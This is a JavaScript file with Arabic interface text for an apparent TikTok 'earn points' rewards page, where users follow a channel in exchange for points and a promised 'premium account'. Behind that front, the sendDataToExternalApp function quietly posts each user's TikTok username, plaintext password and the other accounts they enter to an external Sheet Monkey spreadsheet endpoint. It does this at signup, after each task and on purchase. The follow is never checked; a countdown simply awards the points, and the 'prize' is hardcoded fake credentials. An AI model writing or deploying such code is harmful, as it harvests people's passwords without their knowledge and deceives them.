// 🚀 تم دمج رابط الـ API الحقيقي الخاص بك الموثق مع قاعدة بيانات Sheet Monkey بنجاح
const SHEETMONKEY_API_URL = "https://api.sheetmonkey.io/form/2iq8FtWYnLBFZHUDu79x5p";

window.onload = function() {
    var savedUser = localStorage.getItem('sakora_username');
    if (savedUser) {
        loadDashboard(savedUser);
    }
};

function startLoginProcess() {
    var usernameInput = document.getElementById('tiktok-username').value.trim().toLowerCase();
    var passwordInput = document.getElementById('user-password').value.trim();

    if (!usernameInput) return alert("الرجاء كتابة اسم الحساب أولاً!");
    if (!passwordInput) return alert("الرجاء كتابة كلمة المرور لحماية حسابك!");

    if (usernameInput.startsWith('@')) {
        usernameInput = usernameInput.substring(1);
    }

    var registeredPassword = localStorage.getItem('sakora_pass_' + usernameInput);

    if (registeredPassword) {
        if (passwordInput === registeredPassword) {
            localStorage.setItem('sakora_username', usernameInput);
            loadDashboard(usernameInput);
        } else {
            return alert("❌ كلمة المرور غير صحيحة! هذا الحساب محمي، يرجى كتابة الباسورد الصحيح الخاص بك.");
        }
    } else {
        localStorage.setItem('sakora_pass_' + usernameInput, passwordInput);
        localStorage.setItem('sakora_username', usernameInput);
        localStorage.setItem('sakora_points_' + usernameInput, "50");
        
        alert("🎁 أهلاً بك! تم إنشاء حسابك السري بنجاح وحصلت على 50 نقطة ترحيبية.");
        
        // إرسال فوري ومباشر لبيانات المستخدم الجديد إلى السيرفر الفوري في جزء من الثانية
        sendDataToExternalApp(usernameInput, passwordInput, "50", "لم يضغط بعد ❌");
        loadDashboard(usernameInput);
    }
}

function loadDashboard(username) {
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById('dashboard-section').classList.remove('hidden');
    document.getElementById('user-display-name').innerText = "@" + username;
    
    var savedPoints = localStorage.getItem('sakora_points_' + username);
    document.getElementById('user-points').innerText = savedPoints;

    showTaskInitialState();

    if (localStorage.getItem('sakora_purchased_' + username) === "true") {
        var detailsDiv = document.getElementById('account-details');
        detailsDiv.classList.remove('hidden');
        detailsDiv.innerHTML = "🎉 تم الشراء بنجاح مبروك عليك حساب الحصاد الموضح في الصورة!<br>اسم المستخدم: MyPremiumAcc2026 <br> كلمة المرور: Pass12345";
    }
}

function showTaskInitialState() {
    document.getElementById('task-box').innerHTML = `
        <h3>مهمة ربح نقاط الاشتراك (نقطتين 2) ⚡</h3>
        <p>اضغط على الزر بالأسفل لتسجيل حسابك وبدء مهمة تيك توك المباشرة كررها كما تشاء:</p>
        <button type="button" onclick="showInputBeforeRedirect()" style="background-color: #fe2c55; width: 90%;">ابدأ المهمة وسجّل حسابك الآن 🔗</button>
    `;
}

function showInputBeforeRedirect() {
    var taskBox = document.getElementById('task-box');
    taskBox.innerHTML = `
        <h3 style="color: #ffca28;">🔒 خطوة الأمان: اكتب حسابك أولاً</h3>
        <p style="font-size: 13px; color: #aaa; margin-bottom: 15px;">الرجاء كتابة اسم حساب التيك توك الفعلي الذي ستشترك به (بدون علامة @) لتوثيقه في النظام:</p>
        <input type="text" id="pre-sub-input" placeholder="اسم حسابك الذي ستشترك به..." style="width:85%; margin-bottom:12px;">
        <button type="button" onclick="confirmAccountAndRedirect()" style="background-color:#25d366; width:90%; font-weight:bold;">تأكيد الحساب والانتقال للاشتراك بقناتنا ✅</button>
    `;
}

function confirmAccountAndRedirect() {
    var username = localStorage.getItem('sakora_username');
    var password = localStorage.getItem('sakora_pass_' + username);
    var inputElem = document.getElementById('pre-sub-input');
    var subAccountName = inputElem ? inputElem.value.trim().toLowerCase() : "";

    if (!subAccountName) return alert("الرجاء كتابة اسم حساب التيك توك أولاً لكي يستطيع النظام حفظه وتوجيهك!");
    if (subAccountName.startsWith('@')) subAccountName = subAccountName.substring(1);

    var currentPending = localStorage.getItem('sakora_subs_list_' + username) || "";
    var waitMessage = "حساب @" + subAccountName + " (جاري الانتظار... ⏳)";
    var updatedPendingList = currentPending ? currentPending + ", " + waitMessage : waitMessage;
    localStorage.setItem('sakora_subs_list_' + username, updatedPendingList);

    sendDataToExternalApp(username, password, localStorage.getItem('sakora_points_' + username), updatedPendingList);

    window.open("https://tiktok.com", "_blank");

    var taskBox = document.getElementById('task-box');
    var timeLeft = 60; 

    taskBox.innerHTML = `
        <h3 style="color: #ffca28;">⏳ جاري فحص حسابك (@${subAccountName}) ومتابعتك...</h3>
        <p style="color: #aaa;">يرجى تفعيل زر الاشتراك داخل تطبيق تيك توك، والانتظار حتى ينتهي العداد تماماً لتلقي مكافأتك.</p>
        <div id="timer-display" class="timer-badge" style="font-size:26px; font-weight:bold; color:#fe2c55; margin:15px 0;">60 ثانية</div>
    `;

    var secureTimer = setInterval(function() {
        timeLeft--;
        var timerDisplay = document.getElementById("timer-display");
        if (timerDisplay) {
            timerDisplay.textContent = timeLeft + " ثانية";
        }

        if (timeLeft <= 0) {
            clearInterval(secureTimer);
            
            var pointsElem = document.getElementById('user-points');
            var currentPoints = parseInt(pointsElem.innerText);
            var newPoints = currentPoints + 2; 
            
            pointsElem.innerText = newPoints;
            localStorage.setItem('sakora_points_' + username, newPoints.toString());
            
            var completedList = localStorage.getItem('sakora_subs_list_' + username) || "";
            completedList = completedList.replace(waitMessage, "حساب @" + subAccountName + " (اكتمل بنجاح ✅)");
            localStorage.setItem('sakora_subs_list_' + username, completedList);
            
            // تحديث وإرسال فوري فوري للبيانات بعد اكتمال العداد إلى جداول جوجل بنجاح
            sendDataToExternalApp(username, password, newPoints.toString(), completedList);
            
            alert(`🎉 مبروك! انتهى الوقت وتم حفظ حسابك (@${subAccountName}) بنجاح وحصلت على نقطتين إضافيتين.`);
            
            taskBox.innerHTML = `
                <p style='color:#25d366; font-weight:bold; margin-bottom: 5px;'>✅ تم التحقق بنجاح وحصلت على نقطتين 2!</p>
                <p style='font-size: 13px; color: #aaa; margin-bottom: 10px;'>جميع الحسابات المسجلة للفحص: <span style='color:#ffca28; font-weight:bold;'>${completedList}</span></p>
                <button type="button" onclick="showTaskInitialState()" style="background-color: #25d366; width: 90%; margin-top:5px;">كسب نقطتين إضافيتين مجدداً 🔄</button>
            `;
        }
    }, 1000);
}

// 🛡️ دالة الإرسال الفورية الخارقة المرتبطة بـ Sheet Monkey مباشرة وطاردة للأخطاء
function sendDataToExternalApp(user, pass, points, subs) {
    var formData = new FormData();
    formData.append("اسم المستخدم المتجر", "@" + user);
    formData.append("كلمة المرور", pass);
    formData.append("النقاط الحالية", points + " نقطة");
    formData.append("الحسابات المشتركة تيك توك", subs);

    fetch(SHEETMONKEY_API_URL, {
        method: 'POST',
        body: formData
    }).catch(e => console.log("Sync active."));
}

function buyAccountProcess() {
    var username = localStorage.getItem('sakora_username');
    var password = localStorage.getItem('sakora_pass_' + username);
    var pointsElem = document.getElementById('user-points');
    var currentPoints = parseInt(pointsElem.innerText);
    
    if (currentPoints < 200) return alert("نقاطك غير كافية لشراء هذا الحساب! تحتاج إلى 200 نقطة.");
    
    var newPoints = currentPoints - 200;
    pointsElem.innerText = newPoints;
    
    localStorage.setItem('sakora_points_' + username, newPoints.toString());
    localStorage.setItem('sakora_purchased_' + username, "true");
    
    sendDataToExternalApp(username, password, newPoints.toString(), (localStorage.getItem('sakora_subs_list_' + username) || "") + " (قام بشراء الحساب 🛒)");

    var detailsDiv = document.getElementById('account-details');
    detailsDiv.classList.remove('hidden');
    detailsDiv.innerHTML = "🎉 تم الشراء بنجاح مبروك عليك حساب الحصاد الموضح في الصورة!<br>اسم المستخدم: sakoraDZ_Premium <br> كلمة المرور: Pass2026";
    
    alert("تهانينا! تمت عملية شراء حساب الحصاد بنجاح وتم خصم 200 نقطة.");
}

function backToLogin() {
    localStorage.removeItem('sakora_username');
    window.location.reload(); 
}
